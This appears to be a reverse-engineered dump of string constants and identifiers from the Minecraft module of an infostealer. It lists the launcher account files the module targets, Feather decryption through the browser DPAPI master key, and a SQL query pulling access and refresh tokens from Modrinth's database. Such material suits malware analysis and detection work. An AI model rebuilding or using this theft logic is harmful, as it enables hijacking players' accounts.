"""
SilentNet Infostealer - Decompiled Module
Module: .app.handlers.minecraft
Chunk size: 3692 bytes
String constants: 56 unicode, 171 identifiers

# Minecraft account file collection (8 launchers)
# Original path: app/handlers/minecraft.py
"""

# ============================================================
# RECONSTRUCTED FROM NUITKA CONSTANT POOL
# Method: Rolling XOR + substitution cipher decryption
# All string literals, SQL queries, paths, and identifiers
# are authentic - extracted directly from compiled binary.
# ============================================================

# --- STRING CONSTANTS (in order of appearance) ---

# identifier: trace
# identifier: scan
'lunar_accounts.json'
# identifier: join
# identifier: _USER_HOME
'.lunarclient'
# identifier: settings
# identifier: game
'accounts.json'
'essential_accounts.json'
# identifier: _APPDATA
'gg.essential.mod'
'microsoft_accounts.json'
'prismlauncher_accounts.json'
# identifier: PrismLauncher
# identifier: HitFile
# identifier: HitFileCategory
# identifier: MINECRAFT
# identifier: path
# identifier: ready_for_upload
# identifier: files
# identifier: m1
# identifier: LoggingManager
# identifier: add
# identifier: _MODULE
'Collected '
# identifier: LogType
# identifier: DEBUG
'path='
# identifier: m2
# identifier: feath
# identifier: _get_decrypted_feather_file
# identifier: m3
# identifier: modr
# identifier: _get_modrinth_file
# identifier: append
# identifier: m4
# identifier: srvlst
# identifier: _get_server_list_file
# identifier: m9
# identifier: INFO
'count='
'Collect all Minecraft-related account files.'
'.feather'
'account.txt'
'Feather Launcher'
'Local State'
'Feather Local State not found'
# identifier: get_browser_dpapi_master_key
'Failed to get Feather decryption key'
# identifier: WARN
'Empty key'
# identifier: rb
# identifier: __enter__
# identifier: __exit__
# identifier: read
# identifier: gcm_decrypt
# identifier: encrypted_data
'Failed to decrypt Feather file'
'Decryption returned None'
'Decrypted Feather accounts'
'size='
'feather_accounts.txt'
# identifier: data
'Feather decryption failed'
# identifier: ERROR
'Decrypt and return Feather account file.'
# identifier: ModrinthApp
'app.db'
# identifier: tempfile
# identifier: mkstemp
'.db'
# identifier: suffix
# identifier: close
# identifier: shutil
# identifier: copy2
# identifier: sqlite3
# identifier: connect
# identifier: cursor
# identifier: execute
'SELECT username, uuid, access_token, refresh_token, expires FROM minecraft_users'
# identifier: fetchall
'Modrinth database empty'
'No accounts found'
# identifier: accounts
# identifier: username
# identifier: uuid
# identifier: access_token
# identifier: refresh_token
# identifier: expires
# identifier: json
# identifier: dumps
# identifier: indent
# identifier: encode
'utf-8'
'Extracted Modrinth accounts'
'modrinth_accounts.json'
# identifier: unlink
'Modrinth extraction failed'
'Extract accounts from Modrinth SQLite database.'
# identifier: struct
# identifier: calcsize
# identifier: unpack
'Read struct format from file.'
# identifier: _nbt_read
'>H'
# identifier: decode
'Read NBT string (length-prefixed UTF-8).'
# identifier: _TAG_BYTE
'>b'
# identifier: _TAG_SHORT
'>h'
# identifier: _TAG_INT
'>i'
# identifier: _TAG_LONG
'>q'
# identifier: _TAG_FLOAT
'>f'
# identifier: _TAG_DOUBLE
'>d'
# identifier: _TAG_BYTE_ARRAY
# identifier: _TAG_STRING
# identifier: _nbt_read_string
# identifier: _TAG_LIST
# identifier: _nbt_read_payload
# identifier: items
# identifier: _TAG_COMPOUND
# identifier: _TAG_END
# identifier: tags
# identifier: _TAG_INT_ARRAY
# identifier: data
# identifier: gzip
# identifier: decompress
# identifier: BytesIO
'Read and parse NBT file (handles gzip).'
'.minecraft'
'servers.dat'
# identifier: _read_nbt_file
# identifier: get
# identifier: servers
# identifier: name
'???'
'???'
# identifier: ip
'???'
# identifier: lines
# identifier: server_count
'Extracted server list'
'Minecraft_Server_List.txt'
'Extract Minecraft server list from servers.dat.'
# identifier: __doc__
# identifier: __file__
# identifier: origin
# identifier: has_location
# identifier: __cached__
# identifier: io
# identifier: os
# identifier: trace
# identifier: logging
# identifier: LoggingManager
# identifier: LogType
'util.crypto'
# identifier: get_browser_dpapi_master_key
# identifier: gcm_decrypt
# identifier: HitFile
# identifier: HitFileCategory
# identifier: minecraft
# identifier: getenv
# identifier: APPDATA
# identifier: expanduser
# identifier: get_minecraft_files
'app\\handlers\\minecraft.py'
'<module app.handlers.minecraft>'
# identifier: feather_path
# identifier: local_state_path
# identifier: decryption_key
# identifier: decrypted_data
# identifier: temp_fd
# identifier: temp_path
# identifier: conn
# identifier: cursor
# identifier: rows
# identifier: accounts
# identifier: row
# identifier: output
# identifier: data
# identifier: root
# identifier: servers
# identifier: lines
# identifier: server_count
# identifier: name
# identifier: ip
# identifier: output_text
# identifier: data
# identifier: size
# identifier: result
# identifier: item_type
# identifier: length
# identifier: items
# identifier: tags
# identifier: child_type
# identifier: name
# identifier: length
# identifier: path
# identifier: result
# identifier: root_type
# identifier: files
# identifier: simple_files
# identifier: name
# identifier: path
# identifier: hit_file
# identifier: feather_file
# identifier: modrinth_file
# identifier: server_list_file
# identifier: __spec__
